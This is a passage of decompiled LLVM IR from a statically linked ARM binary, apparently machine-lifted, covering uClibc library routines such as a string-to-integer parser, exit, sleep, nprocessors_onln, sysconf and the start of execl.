  %v3_17818 = zext i8 %v2_17818 to i32
  %v4_1781c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 676) to i32*), align 4
  store i32 %v4_1781c, i32* @r2, align 4
  %v2_17820 = mul nuw nsw i32 %v3_17818, 2
  %v2_17824 = add i32 %v2_17820, %v4_1781c
  %v3_17824 = inttoptr i32 %v2_17824 to i16*
  %v4_17824 = load i16, i16* %v3_17824, align 2
  %v1_17828 = and i16 %v4_17824, 32
  %v2_17828 = icmp eq i16 %v1_17828, 0
  br i1 %v2_17828, label %dec_label_pc_17830, label %dec_label_pc_17814

dec_label_pc_17830:                               ; preds = %dec_label_pc_17818
  %v7_17830 = icmp eq i8 %v2_17818, 43
  br i1 %v7_17830, label %dec_label_pc_17850, label %dec_label_pc_17838

dec_label_pc_17838:                               ; preds = %dec_label_pc_17830
  %v7_17838 = icmp eq i8 %v2_17818, 45
  br i1 %v7_17838, label %dec_label_pc_17850, label %bb

bb:                                               ; preds = %dec_label_pc_17838
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17854

dec_label_pc_17850:                               ; preds = %dec_label_pc_17830, %dec_label_pc_17838
  %storemerge47 = phi i32 [ 1, %dec_label_pc_17838 ], [ 0, %dec_label_pc_17830 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_17850 = add i32 %v0_17850, 1
  store i32 %v1_17850, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %bb, %dec_label_pc_17850
  %v0_17874 = phi i32 [ %v0_17850, %bb ], [ %v1_17850, %dec_label_pc_17850 ]
  %v1_17854 = and i32 %v0_17804, -17
  %v3_17854 = icmp eq i32 %v1_17854, 0
  br i1 %v3_17854, label %dec_label_pc_17860, label %bb60

bb60:                                             ; preds = %dec_label_pc_17854
  br label %bb64

dec_label_pc_17860:                               ; preds = %dec_label_pc_17854
  %v1_17860 = inttoptr i32 %v0_17874 to i8*
  %v2_17860 = load i8, i8* %v1_17860, align 1
  %v7_17864 = icmp eq i8 %v2_17860, 48
  %v1_17868 = add i32 %v0_17804, 10
  store i32 %v1_17868, i32* %r5.global-to-local, align 4
  br i1 %v7_17864, label %dec_label_pc_17874, label %bb61

bb61:                                             ; preds = %dec_label_pc_17860
  br label %.thread8

dec_label_pc_17874:                               ; preds = %dec_label_pc_17860
  %v1_17874 = add i32 %v0_17874, 1
  %v2_17874 = inttoptr i32 %v1_17874 to i8*
  %v3_17874 = load i8, i8* %v2_17874, align 1
  %v4_17874 = zext i8 %v3_17874 to i32
  store i32 %v1_17874, i32* %r4.global-to-local, align 4
  %v1_17878 = or i32 %v4_17874, 32
  %v7_1787c = icmp eq i32 %v1_17878, 120
  %v1_17880 = add i32 %v0_17804, 8
  store i32 %v1_17880, i32* %r5.global-to-local, align 4
  br i1 %v7_1787c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_17874
  %v3_1788c = mul i32 %v1_17880, 2
  store i32 %v3_1788c, i32* %r5.global-to-local, align 4
  %v2_17890 = add i32 %v0_17874, 2
  store i32 %v2_17890, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17874, %bb61, %bb62
  %v1_1795c30 = phi i32 [ %v0_17808, %bb61 ], [ %v1_17874, %bb62 ], [ %v1_17874, %dec_label_pc_17874 ]
  %v0_178e021 = phi i32 [ %v0_17874, %bb61 ], [ %v2_17890, %bb62 ], [ %v1_17874, %dec_label_pc_17874 ]
  %v0_17894 = phi i32 [ %v1_17868, %bb61 ], [ %v3_1788c, %bb62 ], [ %v1_17880, %dec_label_pc_17874 ]
  %v5_17898 = icmp slt i32 %v0_17894, 16
  br i1 %v5_17898, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1795c29 = phi i32 [ %v0_17808, %bb60 ], [ %v1_1795c30, %.thread8 ], [ %v1_1795c30, %bb63 ]
  %v0_178e020 = phi i32 [ %v0_17874, %bb60 ], [ %v0_178e021, %.thread8 ], [ %v0_178e021, %bb63 ]
  %v0_178c0 = phi i32 [ %v0_17804, %bb60 ], [ %v0_17894, %.thread8 ], [ 16, %bb63 ]
  %v1_1789c = add i32 %v0_178c0, -2
  %tmp = icmp ugt i32 %v1_1789c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_178ac

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17958

dec_label_pc_178ac:                               ; preds = %bb64
  %v2_178b4 = udiv i32 -1, %v0_178c0
  %v3_178b4 = urem i32 -1, %v0_178c0
  %v1_178c4 = urem i32 %v3_178b4, 256
  store i32 %v1_178c4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_178b4, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_178e0

dec_label_pc_178dc:                               ; preds = %bb71, %dec_label_pc_1793c
  %v0_178dc = phi i32 [ %v1_1791c44, %bb71 ], [ %v0_178dc.pre, %dec_label_pc_1793c ]
  br label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178ac, %dec_label_pc_178dc
  %v1_1795c27 = phi i32 [ %v1_1795c29, %dec_label_pc_178ac ], [ %v0_178dc, %dec_label_pc_178dc ]
  %v0_1791c = phi i32 [ %v0_178e020, %dec_label_pc_178ac ], [ %v0_178dc, %dec_label_pc_178dc ]
  %v1_178e0 = inttoptr i32 %v0_1791c to i8*
  %v2_178e0 = load i8, i8* %v1_178e0, align 1
  %v3_178e0 = zext i8 %v2_178e0 to i32
  %v1_178e4 = add nsw i32 %v3_178e0, -48
  %v1_178e8 = urem i32 %v1_178e4, 256
  %v1_178f0 = or i32 %v3_178e0, 32
  store i32 %v1_178f0, i32* @r2, align 4
  %tmp79 = icmp ult i32 %v1_178e8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_178f8

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178e0
  %v1_178fc = add nsw i32 %v1_178f0, -87
  store i32 %v1_178fc, i32* @r2, align 4
  %tmp80 = icmp ugt i32 %v1_178f0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_178f8
  %v5_17904 = urem i32 %v1_178fc, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_178e0, %dec_label_pc_178f8, %bb65
  %v3_17934 = phi i32 [ %v1_178e8, %dec_label_pc_178e0 ], [ 40, %dec_label_pc_178f8 ], [ %v5_17904, %bb65 ]
  %v1_17908 = load i32, i32* %r5.global-to-local, align 4
  %v6_1790c = icmp slt i32 %v3_17934, %v1_17908
  br i1 %v6_1790c, label %dec_label_pc_17910, label %dec_label_pc_17958.loopexit

dec_label_pc_17910:                               ; preds = %bb66
  %v0_17910 = load i32, i32* @ip, align 4
  %v1_17910 = load i32, i32* %r8.global-to-local, align 4
  %v9_17910 = icmp eq i32 %v0_17910, %v1_17910
  br i1 %v9_17910, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_17910
  %v1_1791c40 = add i32 %v0_1791c, 1
  store i32 %v1_1791c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17924

bb67:                                             ; preds = %dec_label_pc_17910
  %v3_17910 = icmp ult i32 %v0_17910, %v1_17910
  %v1_1791c = add i32 %v0_1791c, 1
  store i32 %v1_1791c, i32* %r4.global-to-local, align 4
  br i1 %v3_17910, label %dec_label_pc_17924, label %dec_label_pc_1793c

dec_label_pc_17924:                               ; preds = %bb67, %.thread39
  %v1_1791c44 = phi i32 [ %v1_1791c40, %.thread39 ], [ %v1_1791c, %bb67 ]
  %v4_1792c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_17924 = load i32, i32* %sl.global-to-local, align 4
  %v3_17924 = icmp uge i32 %v3_17934, %v1_17924
  %v9_17924 = icmp eq i32 %v3_17934, %v1_17924
  %v2_17928 = xor i1 %v3_17924, true
  %v3_17928 = or i1 %v9_17924, %v2_17928
  br i1 %v3_17928, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_17924
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_17924, %bb68
  %v4_1792c = phi i32 [ %v4_1792c2443, %dec_label_pc_17924 ], [ 0, %bb68 ]
  %v2_1792c = xor i1 %v9_17924, true
  %v3_1792c = and i1 %v3_17924, %v2_1792c
  br i1 %v3_1792c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_1792c = urem i32 %v4_1792c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_17930 = phi i32 [ %v5_1792c, %bb70 ], [ %v4_1792c, %bb69 ]
  %v2_17930 = icmp eq i32 %v0_17930, 0
  br i1 %v2_17930, label %bb71, label %dec_label_pc_1793c

bb71:                                             ; preds = %thread-pre-split
  %v4_17934 = mul i32 %v0_17910, %v1_17908
  %v5_17934 = add i32 %v4_17934, %v3_17934
  store i32 %v5_17934, i32* @ip, align 4
  br label %dec_label_pc_178dc

dec_label_pc_1793c:                               ; preds = %bb67, %thread-pre-split
  %v0_1793c = call i32 @__GI___errno_location()
  %v0_17944 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17944, i32* @ip, align 4
  %v0_17948 = load i32, i32* %r7.global-to-local, align 4
  %v2_17948 = and i32 %v0_17948, %v0_1780c
  store i32 %v2_17948, i32* %r7.global-to-local, align 4
  %v2_17950 = inttoptr i32 %v0_1793c to i32*
  store i32 34, i32* %v2_17950, align 4
  %v0_178dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_178dc

dec_label_pc_17958.loopexit:                      ; preds = %bb66
  %v0_17958.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17958

dec_label_pc_17958:                               ; preds = %.thread, %dec_label_pc_17958.loopexit
  %v1_1795c = phi i32 [ %v1_1795c27, %dec_label_pc_17958.loopexit ], [ %v1_1795c29, %.thread ]
  %v2_1795c = phi i32 [ %v0_17958.pre, %dec_label_pc_17958.loopexit ], [ %v0_17800, %.thread ]
  %v2_17958 = icmp eq i32 %v2_1795c, 0
  br i1 %v2_17958, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_17958
  %v3_1795c = inttoptr i32 %v2_1795c to i32*
  store i32 %v1_1795c, i32* %v3_1795c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_17958, %bb72
  %v0_17964 = load i32, i32* %r7.global-to-local, align 4
  %v2_17964 = icmp eq i32 %v0_17964, 0
  %. = select i1 %v2_17964, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_17970 = icmp eq i32 %v0_1780c, 0
  %v0_17994.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17970, label %dec_label_pc_1798c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_17994.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1797c, label %dec_label_pc_1798c

dec_label_pc_1797c:                               ; preds = %bb76
  %v0_1797c = call i32 @__GI___errno_location()
  %v2_17984 = inttoptr i32 %v0_1797c to i32*
  store i32 34, i32* %v2_17984, align 4
  %v0_17988 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17988, i32* @ip, align 4
  %v0_1798c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1798c

dec_label_pc_1798c:                               ; preds = %bb76, %bb73, %dec_label_pc_1797c
  %v0_17994.pre = phi i32 [ %v0_17994.pre.pre, %bb76 ], [ %v0_17988, %dec_label_pc_1797c ], [ %v0_17994.pre.pre, %bb73 ]
  %v0_1798c = phi i32 [ %v0_17964, %bb76 ], [ %v0_1798c.pre, %dec_label_pc_1797c ], [ %v0_17964, %bb73 ]
  %v2_1798c = icmp eq i32 %v0_1798c, 0
  br i1 %v2_1798c, label %dec_label_pc_1798c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1798c
  %v2_17990 = sub i32 0, %v0_17994.pre
  store i32 %v2_17990, i32* @ip, align 4
  br label %dec_label_pc_1798c._crit_edge

dec_label_pc_1798c._crit_edge:                    ; preds = %dec_label_pc_1798c, %bb77
  %v0_17994 = phi i32 [ %v2_17990, %bb77 ], [ %v0_17994.pre, %dec_label_pc_1798c ]
  ret i32 %v0_17994

; uselistorder directives
  uselistorder i32 %v0_17994.pre, { 1, 0 }
  uselistorder i32 %v0_17994.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1792c, { 1, 0 }
  uselistorder i1 %v3_17924, { 1, 0 }
  uselistorder i32 %v1_17924, { 1, 0 }
  uselistorder i32 %v1_178e8, { 1, 0 }
  uselistorder i32 %v0_1791c, { 1, 0, 2 }
  uselistorder i32 %v0_178dc, { 1, 0 }
  uselistorder i32 %v3_1788c, { 1, 0 }
  uselistorder i32 %v1_17880, { 1, 0, 2 }
  uselistorder i32 %v0_17874, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_17850, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1780c, { 1, 0 }
  uselistorder i32 %v0_17808, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17804, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_1798c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1798c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_17958, { 1, 0 }
  uselistorder label %dec_label_pc_1793c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178e0, { 1, 0 }
  uselistorder label %dec_label_pc_178dc, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17854, { 1, 0 }
  uselistorder label %dec_label_pc_17850, { 1, 0 }
  uselistorder label %dec_label_pc_17818, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  %v4_179b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 92) to i32*), align 4
  store i32 %v4_179b8, i32* @r4, align 4
  %v2_179c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_179d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_179d8)
  %v0_179ec = load i32, i32* @r5, align 4
  %v2_179ec = add i32 %v0_179ec, 16
  %v3_179ec = inttoptr i32 %v2_179ec to i32*
  %v4_179ec = load i32, i32* %v3_179ec, align 4
  call void @__pseudo_branch(i32 %v4_179ec)
  %v0_179fc = load i32, i32* @r5, align 4
  %v2_179fc = add i32 %v0_179fc, 26424
  %v3_179fc = inttoptr i32 %v2_179fc to i32*
  %v4_179fc = load i32, i32* %v3_179fc, align 4
  %v2_17a00 = icmp eq i32 %v4_179fc, 0
  br i1 %v2_17a00, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_17a0c = xor i1 %v2_17a00, true
  call void @__pseudo_cond_branch(i1 %v2_17a0c, i32 %v4_179fc)
  store i32 %v2_179c0, i32* @r0, align 4
  %v0_17a1c = load i32, i32* @r5, align 4
  %v2_17a1c = add i32 %v0_17a1c, 24
  %v3_17a1c = inttoptr i32 %v2_17a1c to i32*
  %v4_17a1c = load i32, i32* %v3_17a1c, align 4
  call void @__pseudo_branch(i32 %v4_17a1c)
  %v0_17a28 = call i32 @__GI___uClibc_fini()
  %v0_17a30 = load i32, i32* @r5, align 4
  %v2_17a30 = add i32 %v0_17a30, -91940
  %v9_17a30 = icmp eq i32 %v2_17a30, 0
  br i1 %v9_17a30, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_17a38 = xor i1 %v9_17a30, true
  call void @__pseudo_cond_branch(i1 %v2_17a38, i32 %v2_17a30)
  %v0_17a3c = load i32, i32* @r6, align 4
  %v1_17a40 = call i32 @__GI__exit(i32 %v0_17a3c)
  %v0_17a44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a44, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_17a44 = load i32, i32* @r1, align 4
  %v2_17a44 = load i32, i32* @r4, align 4
  %v3_17a44 = load i32, i32* @r6, align 4
  %v8_17a44 = ashr i32 %v2_17a44, %v3_17a44
  %v9_17a44 = and i32 %v8_17a44, %v1_17a44
  store i32 %v9_17a44, i32* @r2, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_17a5c = phi i32 [ %v1_17a40, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_17a5c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_17a64 = load i32, i32* @r4, align 4
  %v6_17a64 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_17a68 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_17a68, label %dec_label_pc_17afc, label %dec_label_pc_17a78

dec_label_pc_17a78:                               ; preds = %entry
  %v2_17a88 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_17a9c = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_17a88)
  %v3_17aa0 = load i32, i32* %stack_var_-44, align 4
  %v7_17aa4 = icmp eq i32 %v3_17aa0, 1
  br i1 %v7_17aa4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17a78
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17a78, %bb
  call void @__pseudo_cond_branch(i1 %v7_17aa4, i32 ptrtoint (i32* @global_var_131ac.1052 to i32))
  %v2_17ab8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_17ac0 = call i32 @__libc_nanosleep(i32 %v2_17ab8, i32 %v2_17ab8)
  %v2_17ac4 = icmp eq i32 %v2_17ac0, 0
  br i1 %v2_17ac4, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_17ad8 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_17ad8, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_17ae8 = load i32, i32* %stack_var_-24, align 4
  %v1_17aec = and i32 %v3_17ae8, 65536
  %v2_17aec = icmp eq i32 %v1_17aec, 0
  br i1 %v2_17aec, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_17aec, i32 ptrtoint (i32* @global_var_131ac.1052 to i32))
  %v0_17afc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17afc

dec_label_pc_17afc:                               ; preds = %entry, %.thread6
  %v0_17afc = phi i32 [ %v0_17afc.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_17a64, i32* @r4, align 4
  store i32 %v6_17a64, i32* @lr, align 4
  ret i32 %v0_17afc

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17afc, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35352), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_17b30 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35352))
  store i32 %v1_17b30, i32* @r6, align 4
  %v2_17b34 = icmp eq i32 %v1_17b30, 0
  br i1 %v2_17b34, label %dec_label_pc_17bb4, label %dec_label_pc_17b3c

dec_label_pc_17b3c:                               ; preds = %entry
  store i32 676, i32* @sl, align 4
  %v0_17b44 = load i32, i32* @r4, align 4
  %v2_17b44 = add i32 %v0_17b44, -35340
  store i32 %v2_17b44, i32* @r8, align 4
  %v2_17b48 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_17b48, i32* @r7, align 4
  br label %bb18

dec_label_pc_17b50:                               ; preds = %bb18
  %v3_17b50 = load i32, i32* %stack_var_-36, align 4
  %v1_17b54 = inttoptr i32 %v3_17b50 to i32*
  %v2_17b54 = load i32, i32* %v1_17b54, align 4
  %v1_17b58 = inttoptr i32 %v2_17b54 to i8*
  %v2_17b58 = load i8, i8* %v1_17b58, align 1
  %v7_17b5c = icmp eq i8 %v2_17b58, 99
  br i1 %v7_17b5c, label %dec_label_pc_17b64, label %.backedge3

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b50
  %v1_17b64 = add i32 %v2_17b54, 1
  %v2_17b64 = inttoptr i32 %v1_17b64 to i8*
  %v3_17b64 = load i8, i8* %v2_17b64, align 1
  %v7_17b68 = icmp eq i8 %v3_17b64, 112
  br i1 %v7_17b68, label %dec_label_pc_17b70, label %.backedge3

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17b64
  %v1_17b70 = add i32 %v2_17b54, 2
  %v2_17b70 = inttoptr i32 %v1_17b70 to i8*
  %v3_17b70 = load i8, i8* %v2_17b70, align 1
  %v7_17b74 = icmp eq i8 %v3_17b70, 117
  br i1 %v7_17b74, label %dec_label_pc_17b7c, label %.backedge3

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b70
  %v1_17b7c = add i32 %v2_17b54, 3
  %v2_17b7c = inttoptr i32 %v1_17b7c to i8*
  %v3_17b7c = load i8, i8* %v2_17b7c, align 1
  %v4_17b7c = zext i8 %v3_17b7c to i32
  %v0_17b80 = load i32, i32* @r4, align 4
  %v1_17b80 = load i32, i32* @sl, align 4
  %v2_17b80 = add i32 %v1_17b80, %v0_17b80
  %v3_17b80 = inttoptr i32 %v2_17b80 to i32*
  %v4_17b80 = load i32, i32* %v3_17b80, align 4
  %v2_17b84 = mul nuw nsw i32 %v4_17b7c, 2
  %v2_17b88 = add i32 %v4_17b80, %v2_17b84
  %v3_17b88 = inttoptr i32 %v2_17b88 to i16*
  %v4_17b88 = load i16, i16* %v3_17b88, align 2
  %v1_17b8c = and i16 %v4_17b88, 8
  %v2_17b8c = icmp eq i16 %v1_17b8c, 0
  br i1 %v2_17b8c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_17b7c
  %v1_17b90 = load i32, i32* @r5, align 4
  %v2_17b90 = add i32 %v1_17b90, 1
  store i32 %v2_17b90, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_17b7c, %dec_label_pc_17b50, %dec_label_pc_17b64, %dec_label_pc_17b70
  %v0_17b94.pre = load i32, i32* @r6, align 4
  %v0_17ba0.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_17b3c
  %v0_17ba0 = phi i32 [ %v0_17ba0.pre, %.backedge3 ], [ %v2_17b44, %dec_label_pc_17b3c ]
  %v0_17b94 = phi i32 [ %v0_17b94.pre, %.backedge3 ], [ %v1_17b30, %dec_label_pc_17b3c ]
  %v4_17ba4 = inttoptr i32 %v0_17b94 to i32*
  %v5_17ba4 = call i32 @__GI_config_read(i32* %v4_17ba4, i32 %v2_17b48, i32 258, i32 %v0_17ba0)
  %v2_17ba8 = icmp eq i32 %v5_17ba4, 0
  br i1 %v2_17ba8, label %dec_label_pc_17c18, label %dec_label_pc_17b50

dec_label_pc_17bb4:                               ; preds = %entry
  %v0_17bb8 = load i32, i32* @r4, align 4
  %v2_17bb8 = add i32 %v0_17bb8, -35336
  store i32 %v2_17bb8, i32* @r0, align 4
  %v1_17bbc = call i32 @__GI_config_open(i32 %v2_17bb8)
  store i32 %v1_17bbc, i32* @r6, align 4
  %v2_17bc0 = icmp eq i32 %v1_17bbc, 0
  br i1 %v2_17bc0, label %bb19, label %dec_label_pc_17bcc

bb19:                                             ; preds = %dec_label_pc_17bb4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17c18

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17bb4
  %v0_17bd0 = load i32, i32* @r4, align 4
  %v2_17bd0 = add i32 %v0_17bd0, -35320
  store i32 %v2_17bd0, i32* @r8, align 4
  %v2_17bd8 = add i32 %v0_17bd0, -35284
  store i32 %v2_17bd8, i32* @r7, align 4
  %v2_17bdc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_17bdc, i32* @r4, align 4
  br label %bb21

dec_label_pc_17be4:                               ; preds = %bb21
  %v0_17c10 = load i32, i32* @r8, align 4
  %v3_17be4 = load i32, i32* %stack_var_-36, align 4
  %v1_17be8 = inttoptr i32 %v3_17be4 to i32*
  %v2_17be8 = load i32, i32* %v1_17be8, align 4
  store i32 %v2_17be8, i32* @r1, align 4
  %v2_17bec = inttoptr i32 %v0_17c10 to i8*
  %v3_17bec = call i32 @__GI_strcoll(i8* %v2_17bec, i32 %v2_17be8)
  %v2_17bf0 = icmp eq i32 %v3_17bec, 0
  br i1 %v2_17bf0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_17be4
  %v1_17bf4 = load i32, i32* @r5, align 4
  %v2_17bf4 = add i32 %v1_17bf4, 1
  store i32 %v2_17bf4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_17be4
  %v0_17c00.pre = load i32, i32* @r7, align 4
  %v0_17c04.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_17bcc
  %v0_17c04 = phi i32 [ %v0_17c04.pre, %.backedge ], [ %v1_17bbc, %dec_label_pc_17bcc ]
  %v0_17c00 = phi i32 [ %v0_17c00.pre, %.backedge ], [ %v2_17bd8, %dec_label_pc_17bcc ]
  %v4_17c08 = inttoptr i32 %v0_17c04 to i32*
  %v5_17c08 = call i32 @__GI_config_read(i32* %v4_17c08, i32 %v2_17bdc, i32 459266, i32 %v0_17c00)
  %v2_17c0c = icmp eq i32 %v5_17c08, 0
  br i1 %v2_17c0c, label %dec_label_pc_17c18, label %dec_label_pc_17be4

dec_label_pc_17c18:                               ; preds = %bb18, %bb21, %bb19
  %v0_17c18 = load i32, i32* @r6, align 4
  %v1_17c1c = inttoptr i32 %v0_17c18 to i32*
  %v2_17c1c = call i32 @__GI_config_close(i32* %v1_17c1c)
  %v0_17c20 = load i32, i32* @r5, align 4
  %v2_17c20 = icmp eq i32 %v0_17c20, 0
  %.v0_17c20 = select i1 %v2_17c20, i32 1, i32 %v0_17c20
  ret i32 %.v0_17c20

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_17c18, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_18044

bb:                                               ; preds = %entry
  %v7_17c70 = mul i32 %arg1, 4
  %v8_17c70 = add i32 %v7_17c70, ptrtoint (i32* @global_var_17c78.1064 to i32)
  call void @__pseudo_branch(i32 %v8_17c70)
  br label %dec_label_pc_18044

dec_label_pc_18044:                               ; preds = %bb, %entry
  %v0_18044 = call i32 @__GI___errno_location()
  store i32 -1, i32* @r2, align 4
  %v2_18050 = inttoptr i32 %v0_18044 to i32*
  store i32 22, i32* %v2_18050, align 4
  %v0_18200 = load i32, i32* @r2, align 4
  ret i32 %v0_18200

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_18234 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_18234, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
